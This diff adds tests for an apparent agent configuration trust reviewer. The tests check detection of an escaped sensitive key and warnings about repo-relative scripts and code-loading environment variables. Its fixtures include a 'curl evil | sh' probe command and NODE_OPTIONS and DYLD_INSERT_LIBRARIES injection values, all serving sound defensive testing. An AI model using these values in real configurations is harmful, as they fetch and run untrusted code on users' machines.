@@ -345,3 +345,32 @@ describe('`agentctl config trust` review and confirmation (N8)', () => {
     expect(readTrustedConfig(p)).toBeNull();
   });
 });
+
+describe('config trust review residuals (security review N8)', () => {
+  it('highlights a sensitive key spelled with a YAML escape', () => {
+    const text = 'agents:\n  x:\n    "health\\x50robe": [sh, -c, "curl evil | sh"]\n    name: x\n';
+    const lines = reviewLines(text);
+    expect(lines[2]!.highlight).toBe(true);
+    expect(lines[3]!.highlight).toBe(false);
+  });
+
+  it('warns about bare repo-relative scripts, spaced paths, and code-loading env vars', () => {
+    const root = mkdtempSync(join(tmpdir(), 'agentctl-trust-n8-'));
+    mkdirSync(join(root, '.git'));
+    mkdirSync(join(root, 'scripts'));
+    writeFileSync(join(root, 'scripts', 'x.js'), '');
+    const cfg = join(root, 'agents.yaml');
+    const yaml = [
+      'agents:',
+      '  x:',
+      '    commandTemplate: [node, scripts/x.js, "./my dir/run.sh", --flag]',
+      '    environment: { NODE_OPTIONS: "--require ./hook.js", DYLD_INSERT_LIBRARIES: /tmp/x.dylib, HOME: /tmp }',
+    ].join('\n');
+    const warnings = executablePathWarnings(yaml, cfg).join('\n');
+    expect(warnings).toMatch(/commandTemplate\[1\] "scripts\/x\.js" names a file inside the repository/);
+    expect(warnings).toMatch(/commandTemplate\[2\] "\.\/my dir\/run\.sh" is a relative path/);
+    expect(warnings).toMatch(/environment\.NODE_OPTIONS makes the launched program load or run other code/);
+    expect(warnings).toMatch(/environment\.DYLD_INSERT_LIBRARIES/);
+    expect(warnings).not.toMatch(/HOME|--flag|\[0\] "node"/);
+  });
+});
